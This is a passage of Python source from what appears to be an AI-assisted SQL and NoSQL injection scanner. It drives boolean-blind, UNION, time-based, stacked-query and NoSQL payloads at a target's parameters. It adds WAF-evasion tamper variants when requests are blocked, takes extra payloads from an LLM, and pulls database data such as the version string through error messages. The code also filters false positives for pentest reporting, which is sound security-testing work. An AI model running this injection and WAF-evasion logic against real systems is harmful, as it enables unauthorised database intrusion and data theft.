                    # change" case — the only thing that reveals it is a delay.
                    tfind = self._test_time_based(
                        url, method, data, content_type, extra_headers,
                        point, baseline, report,
                    )
                    if tfind is not None:
                        return tfind
                return self._test_nosql(
                    url, method, data, content_type, extra_headers, point, baseline, report
                )  # None if not NoSQL-injectable either

        if self._seed_payloads is not None:
            payloads = list(self._seed_payloads)
        else:
            payloads = list(SEED_PAYLOADS[:5])

        # In fast mode, skip the per-parameter LLM suggestion call (slow on
        # local models). Rely on seed payloads + heuristics, use the LLM only
        # to confirm strong hits.
        if self.use_llm and not self.fast and self.llm_deep:
            try:
                llm_payloads = self.agent.suggest_initial_payloads(
                    url, method, point, content_type, baseline
                )
                if llm_payloads:
                    payloads = llm_payloads + payloads
                    report.add_log(
                        f"LLM suggested {len(llm_payloads)} payloads for {point.name}"
                    )
            except Exception as e:
                report.add_error(f"LLM suggest failed for {point.name}: {e}")

        # Apply explicit tamper chain up front, if requested
        if self.tamper:
            from sqli_ai.tamper import apply_tamper
            payloads = [apply_tamper(p, self.tamper) for p in payloads if isinstance(p, str)]

        seen = set()
        unique_payloads = []
        for p in payloads:
            if not isinstance(p, str):
                continue
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)

        best_score = 0.0
        best_exchange: Optional[HttpExchange] = None
        best_evidence = ""
        attempts = 0
        real_attempts = 0  # excludes WAF-blocked requests
        blocked = 0
        tamper_triggered = bool(self.tamper)
        # Hard ceiling so tamper expansion can't run away
        request_ceiling = self.max_attempts * 6 + 10

        idx = 0
        while idx < len(unique_payloads):
            # Budget is spent on requests that actually reach the app, not on
            # ones the WAF refuses — otherwise blocked seeds exhaust the budget
            # before tamper variants get a turn.
            if real_attempts >= self.max_attempts or attempts >= request_ceiling:
                break
            payload = unique_payloads[idx]
            idx += 1
            attempts += 1

            injected = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=payload,
            )
            # Tag time-based payloads so the timing detector calibrates threshold
            _sleep_kw = ("sleep", "waitfor", "pg_sleep", "benchmark")
            if any(kw in payload.lower() for kw in _sleep_kw):
                injected.expected_sleep_ms = self._sleep_ms
            report.add_request(injected)
            report.add_request()

            is_blocked = self._is_blocked(baseline, injected)
            if not is_blocked:
                real_attempts += 1

            score, evidence = self.detector.quick_score(baseline, injected)
            self.on_progress(
                f"    [{attempts}] payload={payload[:40]!r} score={score:.2f} "
                f"HTTP {injected.status_code}"
            )
            if self.show_response:
                snippet = injected.response_body[:300].replace("\n", " ")
                self.on_progress(f"        body: {snippet}")

            # WAF/block detection: baseline was OK but payload is refused.
            if is_blocked:
                blocked += 1
                if (self.auto_tamper and not tamper_triggered and blocked >= 2):
                    tamper_triggered = True
                    from sqli_ai.tamper import AUTO_TAMPER_CHAIN, tamper_variants
                    added = 0
                    for base in list(unique_payloads):
                        for variant in tamper_variants(base, AUTO_TAMPER_CHAIN):
                            if variant not in seen:
                                seen.add(variant)
                                unique_payloads.append(variant)
                                added += 1
                    msg = (
                        f"WAF/filter suspected on {point.name} "
                        f"(baseline {baseline.status_code} -> {injected.status_code}); "
                        f"queued {added} tamper variants"
                    )
                    report.add_log(msg)
                    self.on_progress(f"    [!] {msg}")

            if score > best_score:
                best_score = score
                best_exchange = injected
                best_evidence = evidence

            # Confirmed finding — require strong evidence (0.85+)
            if score >= 0.85:
                finding = self._build_finding(point, injected, baseline, best_evidence, score)
                if finding is not None:
                    finding = self._enrich_error(
                        finding, url, method, data, content_type, extra_headers,
                        point, report,
                    )
                    if not self.continue_on_found:
                        return finding
                    # continue_on_found: record but keep probing for other inj types
                    interim_findings.append(finding)
                    self.on_progress(
                        f"    [!] confirmed (score {score:.0%}) — continuing for more types"
                    )

            # LLM-guided continuation — only in DEEP mode (per-payload LLM calls
            # are the slow, hang-prone path). Default uses the near-miss assist.
            if self.use_llm and not self.fast and self.llm_deep and score >= 0.3:
                try:
                    decision = self.agent.analyze_exchange(
                        baseline, injected, point, score, evidence,
                        attempts, self.max_attempts,
                    )
                    report.add_log(
                        f"{point.name}: {decision.action} — {decision.reasoning[:100]}"
                    )

                    if decision.action == "confirm" and decision.confidence >= 0.7:
                        finding = self._build_finding(
                            point, injected, baseline,
                            decision.reasoning or evidence,
                            decision.confidence,
                            db_hint=decision.db_hint,
                            inj_type=decision.injection_type,
                        )
                        if finding is not None:
                            if not self.continue_on_found:
                                return finding
                            interim_findings.append(finding)

                    if decision.action == "inject" and decision.payload:
                        if decision.payload not in seen:
                            unique_payloads.append(decision.payload)
                            report.add_log(
                                f"LLM next payload: {decision.payload[:60]}"
                            )

                    if decision.action in ("skip", "done"):
                        break
                except Exception as e:
                    report.add_error(f"LLM analyze failed: {e}")

        # Final check on best candidate
        if best_exchange and best_score >= 0.6:
            if self.use_llm and not self.fast and self.llm_deep:
                try:
                    confirm = self.agent.confirm_finding(baseline, best_exchange, point)
                    if confirm.get("vulnerable") and confirm.get("confidence", 0) >= 0.6:
                        raw_type = confirm.get("injection_type", "unknown")
                        try:
                            confirmed_type = InjectionType(raw_type)
                        except ValueError:
                            confirmed_type = self.detector.infer_injection_type(
                                baseline, best_exchange, best_evidence
                            )
                        return Finding(
                            param=point.name,
                            location=point.location,
                            injection_type=confirmed_type,
                            severity=self._map_severity(confirm.get("severity", "medium")),
                            payload=best_exchange.payload or "",
                            evidence=confirm.get("evidence", best_evidence),
                            confidence=float(confirm.get("confidence", best_score)),
                            db_type=confirm.get("db_type"),
                            reasoning=confirm.get("reasoning", ""),
                        )
                except Exception as e:
                    report.add_error(f"LLM confirm failed: {e}")

            if best_score >= 0.75:
                return self._build_finding(
                    point, best_exchange, baseline, best_evidence, best_score
                )

        # Boolean-based detection (OR/AND amplification + true/false pairs).
        # Payloads are POSTFIXED to the original value (Nuclei-style) so the
        # injection lands in the real query context. We run this on any 2xx
        # query/body/json param — not just ones that already reacted to error
        # probes — because boolean-injectable listing/search endpoints often
        # never emit an error. The natural-variance guard below is what keeps
        # this from false-positiving on dynamic/SPA pages.
        is_spa_like = any(seg in url for seg in (
            "/@ng/", "/Edge/", "/Trident/", "/%5C/", "/index.html", "/2fa/",
        ))
        run_bool_blind = (
            not self.fast
            and not is_spa_like
            and point.location.value in _BLIND_LOCATIONS
            and 200 <= baseline.status_code < 300
        )
        if run_bool_blind:
            # sqlmap-style: content-similarity ratios with dynamic-content
            # removal (see _boolean_ratio_detect / compare.py). This replaces
            # the old length-only comparison + reject-on-noise approach.
            bfind = self._boolean_ratio_detect(
                url, method, data, content_type, extra_headers, point, baseline, report
            )
            if bfind is not None:
                return bfind

        # UNION-based detection (reflected marker) — the most expensive fallback,
        # so only on params with a clear reaction (best_score >= 0.5) to keep the
        # per-endpoint request count bounded.
        if (not self.fast and best_score >= 0.5
                and point.location.value in _BLIND_LOCATIONS):
            ufind = self._test_union(
                url, method, data, content_type, extra_headers, point, baseline, report
            )
            if ufind is not None:
                return ufind

        # Time-based blind (fallback): catches blind injections with no error
        # and no content change. Skip speculative mined guesses unless they
        # actually reacted (best_score) to keep request volume bounded.
        if (not self.fast and point.location.value in _BLIND_LOCATIONS
                and (not point.mined or best_score >= 0.3)):
            tfind = self._test_time_based(
                url, method, data, content_type, extra_headers, point, baseline, report
            )
            if tfind is not None:
                return tfind

        # NoSQL injection pair testing (fallback when SQL found nothing).
        nosql_finding = self._test_nosql(
            url, method, data, content_type, extra_headers, point, baseline, report
        )
        if nosql_finding is not None:
            return nosql_finding

        # LLM ASSIST (near-miss): the deterministic engine couldn't confirm, but
        # this param REACTED (0.3 <= best_score < 0.75). Ask the model for a few
        # targeted payloads for THIS context and try them. Low-volume (once per
        # near-miss param), high-value — the sparing way to use the LLM.
        if (self.use_llm and not self.fast and not interim_findings
                and best_exchange is not None and 0.3 <= best_score < 0.75):
            afind = self._llm_assist(
                url, method, data, content_type, extra_headers,
                point, baseline, best_exchange, report,
            )
            if afind is not None:
                return afind

        # If continue_on_found, return the highest-confidence interim finding
        if interim_findings:
            return max(interim_findings, key=lambda f: f.confidence)

        return None

    def _llm_assist(
        self, url, method, data, content_type, extra_headers, point, baseline,
        best_exchange, report,
    ) -> Optional[Finding]:
        """Ask the LLM for targeted payloads on a near-miss param, try them, and
        confirm with the deterministic scorer. One LLM call + a few requests."""
        try:
            payloads = self.agent.suggest_targeted_payloads(
                url, method, point, content_type, baseline, best_exchange,
            )
        except Exception as e:
            report.add_error(f"LLM assist failed for {point.name}: {e}")
            return None
        if not payloads:
            return None
        report.add_log(f"LLM assist: {len(payloads)} targeted payload(s) for {point.name}")
        for pl in payloads[:6]:
            if not isinstance(pl, str) or not pl:
                continue
            ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=self._apply_tamper(pl),
            )
            report.add_request()
            score, ev = self.detector.quick_score(baseline, ex)
            if score >= 0.85:
                finding = self._build_finding(
                    point, ex, baseline, f"LLM-assisted: {ev}", score,
                )
                return self._enrich_error(
                    finding, url, method, data, content_type, extra_headers,
                    point, report,
                )
        return None

    def _boolean_ratio_detect(
        self, url, method, data, content_type, extra_headers, point, baseline, report,
    ) -> Optional[Finding]:
        """sqlmap-style boolean-blind detection via content-similarity ratios.

        1. Send the benign value twice, diff the two responses to find dynamic
           regions (timestamps/tokens) and build a cleaned page template.
        2. If the page is still unstable after stripping, it's too dynamic — bail.
        3. For each AND-based pair (TRUE keeps the original result, FALSE empties
           it), postfix it to the value, strip dynamic content, and compare the
           similarity ratio to the template: a genuine boolean injection shows
           TRUE ~= original while FALSE clearly diverges (the classic sqlmap
           signal), OR the OR-amplification grow/shrink asymmetry.
        """
        from sqli_ai.compare import (
            DIFF_TOLERANCE, HEAVILY_DYNAMIC_BOUND, MIN_STABLE_PAGE,
            UPPER_RATIO_BOUND, find_dynamic_markers, ratio, remove_dynamic,
        )
        from sqli_ai.payloads import BOOLEAN_AND_PAIRS, BOOLEAN_AMPLIFY_PAIRS
        orig = point.original_value or ""

        # Tiny responses make ratio comparison meaningless (a 1-byte "1" flips
        # between ratio 0.0 and 1.0 on any change) — skip the ratio test.
        if len(baseline.response_body or "") < MIN_STABLE_PAGE:
            return None

        # 1+2. Dynamic-content markers from two identical benign requests.
        b2 = self.probe.send(
            url, method, data, content_type, extra_headers,
            inject_point=point, payload=orig,
        )
        report.add_request()
        markers = find_dynamic_markers(baseline.response_body, b2.response_body)
        template = remove_dynamic(baseline.response_body, markers)
        if len(template) < MIN_STABLE_PAGE:
            return None
        self_ratio = ratio(template, remove_dynamic(b2.response_body, markers))
        if self_ratio < HEAVILY_DYNAMIC_BOUND:
            return None  # heavily dynamic even after stripping — unreliable

        # 3. AND-based ratio test + OR amplification, sharing the same requests.
        pairs = BOOLEAN_AND_PAIRS[:4]
        amp_pairs = BOOLEAN_AMPLIFY_PAIRS[:2]
        for i, (true_pl, false_pl) in enumerate(pairs):
            true_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + true_pl,
            )
            false_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + false_pl,
            )
            report.add_request()
            report.add_request()
            # A 500 means we broke syntax → error-based territory, not boolean.
            if true_ex.status_code >= 500 or false_ex.status_code >= 500:
                continue
            if true_ex.status_code != baseline.status_code:
                continue
            tr = ratio(template, remove_dynamic(true_ex.response_body, markers))
            fr = ratio(template, remove_dynamic(false_ex.response_body, markers))
            # TRUE resembles the original page; FALSE clearly diverges from it.
            if tr >= UPPER_RATIO_BOUND and fr < UPPER_RATIO_BOUND and (tr - fr) > DIFF_TOLERANCE:
                # CONFIRM: re-run the pair once and require the same direction.
                # A transient/flaky response (shared hosts, load balancers) can
                # produce a one-off differential; a real boolean injection is
                # reproducible. This kills the transient false positives.
                if not self._confirm_bool_ratio(
                    url, method, data, content_type, extra_headers, point,
                    template, markers, true_pl, false_pl, report,
                ):
                    continue
                ev = (f"Boolean blind (content ratio): TRUE~original={tr:.2f}, "
                      f"FALSE={fr:.2f} (Δ{tr - fr:.2f}); dynamic content stripped; "
                      f"reproduced on re-test")
                return self._build_finding(
                    point, true_ex, baseline, ev, min(0.95, 0.8 + (tr - fr)),
                    inj_type=InjectionType.BOOLEAN_BLIND,
                )
            # OR-amplification (TRUE returns many more rows than FALSE).
            if i < len(amp_pairs):
                amp, amp_ev = self.detector.boolean_amplification_score(
                    baseline, true_ex, false_ex
                )
                if amp >= 0.85:
                    # Confirm amplification is reproducible too.
                    or2 = self.probe.send(url, method, data, content_type,
                                          extra_headers, inject_point=point,
                                          payload=orig + true_pl)
                    and2 = self.probe.send(url, method, data, content_type,
                                           extra_headers, inject_point=point,
                                           payload=orig + false_pl)
                    report.add_request(); report.add_request()
                    amp2, _ = self.detector.boolean_amplification_score(baseline, or2, and2)
                    if amp2 < 0.85:
                        continue
                    return self._build_finding(
                        point, true_ex, baseline, amp_ev + "; reproduced on re-test", amp,
                        inj_type=InjectionType.BOOLEAN_BLIND,
                    )
        return None

    def _confirm_bool_ratio(
        self, url, method, data, content_type, extra_headers, point,
        template, markers, true_pl, false_pl, report,
    ) -> bool:
        """Re-run a candidate boolean-ratio pair once; return True only if the
        TRUE~original / FALSE-diverges signal reproduces (kills transient FPs)."""
        from sqli_ai.compare import (
            DIFF_TOLERANCE, UPPER_RATIO_BOUND, ratio, remove_dynamic,
        )
        orig = point.original_value or ""
        t2 = self.probe.send(url, method, data, content_type, extra_headers,
                             inject_point=point, payload=orig + true_pl)
        f2 = self.probe.send(url, method, data, content_type, extra_headers,
                             inject_point=point, payload=orig + false_pl)
        report.add_request()
        report.add_request()
        tr2 = ratio(template, remove_dynamic(t2.response_body, markers))
        fr2 = ratio(template, remove_dynamic(f2.response_body, markers))
        return tr2 >= UPPER_RATIO_BOUND and fr2 < UPPER_RATIO_BOUND and (tr2 - fr2) > DIFF_TOLERANCE

    def _boolean_amplify_probe(
        self, url, method, data, content_type, extra_headers, point, baseline, report,
        max_pairs: int = 2,
    ) -> Optional[Finding]:
        """Run OR/AND result-amplification pairs (Nuclei-style, postfixed to the
        value) and return a boolean-blind Finding if the OR-true response grows
        while the AND-false response shrinks. Returns None otherwise.
        """
        from sqli_ai.payloads import BOOLEAN_AMPLIFY_PAIRS
        orig = point.original_value or ""
        for or_pl, and_pl in BOOLEAN_AMPLIFY_PAIRS[:max_pairs]:
            or_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + or_pl,
            )
            and_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + and_pl,
            )
            report.add_request()
            report.add_request()
            score, evidence = self.detector.boolean_amplification_score(
                baseline, or_ex, and_ex
            )
            if score >= 0.85:
                return self._build_finding(
                    point, or_ex, baseline, evidence, score,
                    inj_type=InjectionType.BOOLEAN_BLIND,
                )
        return None

    def _natural_variance(
        self, url, method, data, content_type, extra_headers, point, baseline, report
    ) -> float:
        """How much does this endpoint's response vary on its OWN, with no
        injection? Sends a second identical benign request and compares it to
        the baseline (by length AND sampled content). A high value means the
        endpoint is non-deterministic — captcha images, random tokens, rotating
        timestamps — so any true/false 'differential' is noise, not injection.
        """
        orig = point.original_value or ""
        probe = self.probe.send(
            url, method, data, content_type, extra_headers,
            inject_point=point, payload=orig,
        )
        report.add_request()
        a = baseline.response_body or ""
        b = probe.response_body or ""
        m = max(len(a), len(b))
        if m == 0:
            return 0.0
        len_ratio = abs(len(a) - len(b)) / m
        # Content component: sampled char mismatch over the overlap catches
        # random bodies that happen to be the same length (e.g. captcha SVGs).
        n = min(len(a), len(b))
        char_ratio = 0.0
        if n:
            step = max(1, n // 500)
            checked = 0
            mism = 0
            for i in range(0, n, step):
                checked += 1
                if a[i] != b[i]:
                    mism += 1
            char_ratio = mism / checked if checked else 0.0
        return max(len_ratio, char_ratio)

    def _apply_tamper(self, payload: str) -> str:
        """Apply the explicit --tamper chain to a payload (WAF evasion). No-op
        when no chain is configured. Used by the dedicated technique methods so
        time-based/blind detection also evades filters, not just the main suite."""
        if self.tamper and isinstance(payload, str):
            from sqli_ai.tamper import apply_tamper
            return apply_tamper(payload, self.tamper)
        return payload

    def _enrich_json_body(self, url, data, extra_headers, report) -> str:
        """Merge a resource's real JSON field names into a POST/PUT body.

        GETs the same URL; if it returns a JSON object (or a list of objects),
        its leaf keys are added to the write body so body-param injection tests
        actual fields. Best-effort — returns the original body on any failure.
        """
        import json as _json
        try:
            sample = self.probe.send(url, "GET", None, None, extra_headers)
            report.add_request()
        except Exception:
            return data
        ct = ""
        if sample.response_headers:
            ct = sample.response_headers.get("content-type", "")
        try:
            from sqli_ai.param_discovery import discover
            names, _urls, _forms = discover(url, sample.response_body, ct)
        except Exception:
            names = []
        if not names:
            return data
        try:
            obj = _json.loads(data)
            if not isinstance(obj, dict):
                return data
        except (ValueError, TypeError):
            return data
        added = 0
        for k in names:
            if k not in obj and added < 15:
                obj[k] = "1"
                added += 1
        if added:
            report.add_log(f"JSON body enriched with {added} discovered field(s)")
        return _json.dumps(obj)

    def _enrich_error(
        self, finding, url, method, data, content_type, extra_headers, point, report,
    ):
        """Prove exploitability of a confirmed error-based finding by extracting
        data via the DB's error channel (MySQL extractvalue/updatexml, PG/MSSQL
        CAST). On success, embed the leaked value (e.g. the DB version) in the
        evidence, fingerprint the engine, and bump confidence. Best-effort:
        returns the finding unchanged if nothing leaks."""
        if finding is None or finding.injection_type != InjectionType.ERROR_BASED:
            return finding
        if self.fast:
            return finding
        import re

        from sqli_ai.payloads import ERROR_EXTRACT_TEMPLATES
        orig = point.original_value or ""
        for tpl, db in ERROR_EXTRACT_TEMPLATES:
            pl = orig + tpl.format(q="version()")
            ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=pl,
            )
            report.add_request()
            body = ex.response_body or ""
            leaked = None
            mm = re.search(r"~([^~]{2,80})~", body)  # extractvalue/updatexml
            if mm and mm.group(1).strip():
                leaked = mm.group(1).strip()
            else:  # PG/MSSQL cast error leaking a version-like string
                mm2 = re.search(
                    r"(PostgreSQL [\d.]+[^\"'<\n]{0,40}"
                    r"|\d+\.\d+\.\d+[-\w+.]*(?: [^\"'<\n]{0,30})?"
                    r"|Microsoft SQL Server[^\"'<\n]{0,40})",
                    body,
                )
                if mm2 and mm2.group(1).strip() not in ("", orig):
                    leaked = mm2.group(1).strip()
            if leaked:
                finding.db_type = finding.db_type or db
                finding.evidence = (
                    finding.evidence + f"; EXTRACTED (error-based): {leaked[:80]}"
                ).strip("; ")
                finding.reasoning = (
                    (finding.reasoning or "")
                    + f" Data extraction confirmed — leaked: {leaked[:80]}"
                ).strip()
                finding.confidence = max(finding.confidence, 0.95)
                break
        return finding

    def _test_time_based(
        self, url, method, data, content_type, extra_headers, point, baseline, report,
    ) -> Optional[Finding]:
        """Time-based blind detection (the technique from the oscuridad Nuclei
        template): inject a ``SLEEP()``/``pg_sleep()``/``WAITFOR DELAY`` across
        several boundary contexts. If the response is delayed by ~the requested
        seconds AND a ``sleep(0)`` control returns fast, it's a confirmed
        time-based injection. This catches BLIND injections that emit no error
        and don't change the page content — which every other technique misses.

        Cheap on non-injectable params (the sleep is a literal string → fast
        response); only genuinely injectable params incur the delay.
        """
        if self.fast or not self.time_based:
            return None  # time-based is opt-in (--time) — see __init__ note
        from sqli_ai.payloads import (
            STACKED_TIME_TEMPLATES, TIME_BASED_POLYGLOTS, TIME_BASED_TEMPLATES,
        )
        sleep_s = max(1, int(round(self._sleep_ms / 1000)))
        thresh = self._sleep_ms * 0.7
        orig = point.original_value or ""

        # Try context-breaking POLYGLOTS first (one request covers numeric +
        # single-quote + double-quote), then per-context inline payloads, then
        # STACKED-query payloads (a delay there = multi-statement support, a
        # stronger STACKED finding). Tuple: (template, replace, injection_type).
        # `replace=True` sends the payload AS the whole value; else appended.
        attempts = (
            [(t, True, InjectionType.TIME_BLIND) for t in TIME_BASED_POLYGLOTS]
            + [(t, False, InjectionType.TIME_BLIND) for t in TIME_BASED_TEMPLATES]
            + [(t, False, InjectionType.STACKED) for t in STACKED_TIME_TEMPLATES]
        )
        for tpl, replace, itype in attempts:
            payload = tpl.format(s=sleep_s)
            ctrl = tpl.format(s=0)
            send_payload = payload if replace else orig + payload
            send_ctrl = ctrl if replace else orig + ctrl
            # WAF evasion: tamper payload AND control identically so the timing
            # comparison stays valid (both transformed the same way).
            send_payload = self._apply_tamper(send_payload)
            send_ctrl = self._apply_tamper(send_ctrl)
            ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=send_payload,
            )
            ex.expected_sleep_ms = self._sleep_ms
            report.add_request()
            delay = ex.response_time_ms - baseline.response_time_ms
            if delay < thresh:
                continue
            # Confirm: the sleep(0) control must be fast (rules out a slow
            # server / network blip).
            ctrl_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=send_ctrl,
            )
            report.add_request()
            ctrl_delay = ctrl_ex.response_time_ms - baseline.response_time_ms
            # The 0-sleep control must be fast in absolute terms AND clearly
            # faster than the payload (rules out a uniformly slow endpoint).
            if ctrl_delay >= thresh * 0.6 or ctrl_delay >= delay * 0.5:
                continue
            # A real SLEEP(n) delays ~n seconds; a delay many multiples past the
            # request is a noise spike, not the sleep executing.
            if delay > self._sleep_ms * 2.5:
                continue

            # (1) REPRODUCE at the same sleep. A genuine injection delays on
            # EVERY request; a one-off network/rate-limit spike does not. This is
            # the decisive anti-jitter check on shared/flaky hosts (where a single
            # slow sample previously produced dozens of false positives).
            rep_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=send_payload,
            )
            report.add_request()
            rep_delay = rep_ex.response_time_ms - baseline.response_time_ms
            if rep_delay < thresh:
                continue

            # (2) SCALE at 2x. The delay must grow by ~the added sleep time —
            # proportional to the request, not an absolute threshold (noise is
            # slow in both samples and passes an absolute bar; it does not scale).
            long_s = sleep_s * 2
            long_tpl = tpl.format(s=long_s)
            send_long = self._apply_tamper(long_tpl if replace else orig + long_tpl)
            long_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=send_long,
            )
            long_ex.expected_sleep_ms = long_s * 1000
            report.add_request()
            long_delay = long_ex.response_time_ms - baseline.response_time_ms
            base_delay = min(delay, rep_delay)  # the reliable (reproduced) delay
            added_ms = (long_s - sleep_s) * 1000
            if long_delay < base_delay + added_ms * 0.6:
                continue  # didn't scale with the sleep → timing noise, not SQLi

            if itype == InjectionType.STACKED:
                kind = "stacked-query"
            elif replace:
                kind = "polyglot"
            else:
                kind = "per-context"
            return self._build_finding(
                point, ex, baseline,
                f"Time-based blind ({kind}): {payload!r} delayed +{base_delay:.0f}ms "
                f"(~{sleep_s}s, reproduced +{max(delay, rep_delay):.0f}ms); "
                f"control (0s) fast (+{ctrl_delay:.0f}ms); scaled to +{long_delay:.0f}ms "
                f"at {long_s}s (proportional — confirms real delay)",
                0.9, inj_type=itype,
            )
        return None

    def _test_union(
        self, url, method, data, content_type, extra_headers, point, baseline, report,
    ) -> Optional[Finding]:
        """UNION-based detection via a reflected marker.

        Appends ``UNION SELECT '<marker>',...`` with a distinctive marker in
        every column, trying a few boundary contexts and column counts. If the
        marker shows up in the response, the query executed our UNION and echoed
        our data — an unambiguous UNION SQLi (and it tells us the column count).
        Low false-positive by construction: a random marker only appears if the
        injection actually worked.
        """
        if self.fast:
            return None
        marker = "qLmSqLu9182x"
        if marker in (baseline.response_body or ""):
            return None
        orig = point.original_value or ""

        # Reflection guard: many apps echo the request path/params back in an
        # error page (e.g. Juice Shop's "Unexpected path: /api/..?x=<value>").
        # That makes a UNION marker "reflect" even though no query ran — a
        # false positive. Send the marker as a PLAIN value first: if it comes
        # back, this endpoint echoes arbitrary input, so the marker-reflection
        # signal is meaningless here and UNION detection must abort.
        refl_marker = "zXrefl0Q42tk"
        refl = self.probe.send(
            url, method, data, content_type, extra_headers,
            inject_point=point, payload=orig + refl_marker,
        )
        report.add_request()
        if refl_marker in (refl.response_body or ""):
            return None

        max_cols = 8
        for prefix in ("'", ""):
            # 1) Find the column count with ORDER BY N: it succeeds up to the
            #    real count, then errors/changes when N exceeds it. This lets us
            #    build ONE correctly-sized UNION instead of brute-forcing widths.
            ncols = self._union_column_count(
                url, method, data, content_type, extra_headers, point,
                baseline, report, prefix, max_cols,
            )
            # Candidate widths: the discovered count first, else brute 1..max.
            widths = [ncols] if ncols else list(range(1, max_cols + 1))
            for n in widths:
                cols = ",".join(["'%s'" % marker] * n)
                payload = "%s%s UNION SELECT %s-- -" % (orig, prefix, cols)
                ex = self.probe.send(
                    url, method, data, content_type, extra_headers,
                    inject_point=point, payload=payload,
                )
                report.add_request()
                if marker in (ex.response_body or ""):
                    via = f" via ORDER BY→{n} cols" if ncols else ""
                    ev = ("UNION-based SQLi: injected marker reflected "
                          "(%d column(s), boundary %r%s)" % (n, prefix or "numeric", via))
                    return self._build_finding(
                        point, ex, baseline, ev, 0.95,
                        inj_type=InjectionType.UNION_BASED,
                    )
        return None

    def _union_column_count(
        self, url, method, data, content_type, extra_headers, point, baseline,
        report, prefix, max_cols,
    ) -> Optional[int]:
        """Discover a query's column count via ``ORDER BY N``.

        ORDER BY N is valid while N <= column count and errors (or changes the
        response) once N exceeds it. The last N that behaved like the baseline
        is the column count. Returns None if inconclusive (falls back to brute).
        """
        last_ok = 0
        base_status = baseline.status_code
        for n in range(1, max_cols + 1):
            payload = "%s%s ORDER BY %d-- -" % (orig := (point.original_value or ""), prefix, n)
            ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=payload,
            )
            report.add_request()
            errored = (
                ex.status_code != base_status
                or bool(self.detector.find_sql_errors(ex.response_body))
            )
            if errored:
                # N is one past the column count.
                return last_ok if last_ok >= 1 else None
            last_ok = n
        return None  # never errored within range — inconclusive

    def _test_nosql(
        self, url, method, data, content_type, extra_headers, point, baseline, report
    ) -> Optional[Finding]:
        """
        NoSQL (MongoDB/MarsDB) injection test — sqlmap doesn't cover NoSQL.
        Sends boolean true/false pairs (' || '1'=='1' vs '2') and looks for a
        response differential or an explicit NoSQL driver error.
        """
        from sqli_ai.payloads import NOSQL_PAIRS
        if self.fast or not (200 <= baseline.status_code < 300):
            return None
        # Skip non-deterministic endpoints (captcha/random/timestamps) — their
        # true/false diff is noise, not a NoSQL boolean signal.
        if self._natural_variance(
            url, method, data, content_type, extra_headers, point, baseline, report
        ) > 0.15:
            return None
        orig = point.original_value or ""
        for true_pl, false_pl in NOSQL_PAIRS[:3]:
            true_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + true_pl,
            )
            false_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + false_pl,
            )
            report.add_request()
            report.add_request()
            nerr = (self.detector.find_nosql_errors(true_ex.response_body)
                    or self.detector.find_nosql_errors(false_ex.response_body))
            if nerr:
                return self._build_finding(
                    point, true_ex, baseline,
                    f"NoSQL error: {nerr[0][:80]}", 0.85,
                    inj_type=InjectionType.NOSQL,
                )
            score, evidence = self.detector.nosql_boolean_score(
                baseline, true_ex, false_ex
            )
            if score >= 0.8:
                return self._build_finding(
                    point, true_ex, baseline, evidence, score,
                    inj_type=InjectionType.NOSQL,
                )
        return None

    def _build_finding(
        self,
        point: InjectionPoint,
        injected: HttpExchange,
        baseline: HttpExchange,
        evidence: str,
        confidence: float,
        db_hint: Optional[str] = None,
        inj_type: Optional[InjectionType] = None,
    ) -> Finding:
        # A 404 (route-not-found) response is never a SQLi confirmation. Many
        # apps echo the payload back in a "Cannot GET /<payload>" body, which
        # can spuriously match a SQL-error regex (e.g. a reflected
        # `sqlite_version()` next to a JSON "error" key). The query never ran.
        if injected.status_code == 404:
            return None

        # Infrastructure/upstream failure (gateway 502/503/504, connection
        # refused, Envoy/nginx upstream reset) is NOT SQLi — the request didn't
        # reach a working backend. A payload that merely knocks the upstream
        # over (or a transient mesh error) must never be confirmed.
        if self.detector.is_infra_error(injected):
            return None

        # PATH injection: changing a path segment almost always changes the HTTP
        # response (different route, 404, etc.) — that alone is NOT SQLi. So
        # error-based / reflection path findings MUST carry actual SQL error
        # text. The rigorously self-confirming techniques are exempt: they each
        # have an internal control that a mere route change can't fake —
        # time-blind (sleep vs sleep(0) control), boolean-blind (TRUE≈baseline &
        # FALSE≠baseline, re-tested), UNION (random marker reflected), stacked
        # (timing), and NoSQL (boolean differential / driver error). Requiring a
        # SQL error for those would silently drop real blind path SQLi.
        _PATH_SELF_CONFIRMING = {
            InjectionType.TIME_BLIND,
            InjectionType.BOOLEAN_BLIND,
            InjectionType.UNION_BASED,
            InjectionType.STACKED,
            InjectionType.NOSQL,
        }
        if point.location.value == "path" and inj_type not in _PATH_SELF_CONFIRMING:
            if not self.detector.find_sql_errors(injected.response_body):
                return None

        body = injected.response_body or ""
        # XPath injection: the error is an XML/XPath error, NOT SQL — classify
        # it correctly and don't pin a bogus SQL DB type on it. Override even an
        # explicit ERROR_BASED label (the precheck can't tell SQL from XPath),
        # but leave genuinely-different types (boolean/nosql/time) alone.
        if (self.detector.is_xpath_error(body)
                and inj_type in (None, InjectionType.ERROR_BASED)):
            db = None
            itype = InjectionType.XPATH
            if "xpath" not in evidence.lower():
                evidence = (evidence + "; XPath injection (XML query, not SQL)").strip("; ")
        else:
            db = db_hint or self.detector.guess_db_from_errors(body)
            itype = inj_type or self.detector.infer_injection_type(baseline, injected, evidence)

        # Surface a leaked query (ORM error echo) in the evidence — makes the
        # finding self-documenting and pentest-report ready.
        leaked = self.detector.extract_leaked_query(body)
        if leaked and leaked.lower() not in evidence.lower():
            evidence = (evidence + f"; Leaked query: {leaked}").strip("; ")

        severity = Severity.HIGH if confidence >= 0.8 else Severity.MEDIUM
        poc_curl, poc_req = _build_poc(injected)

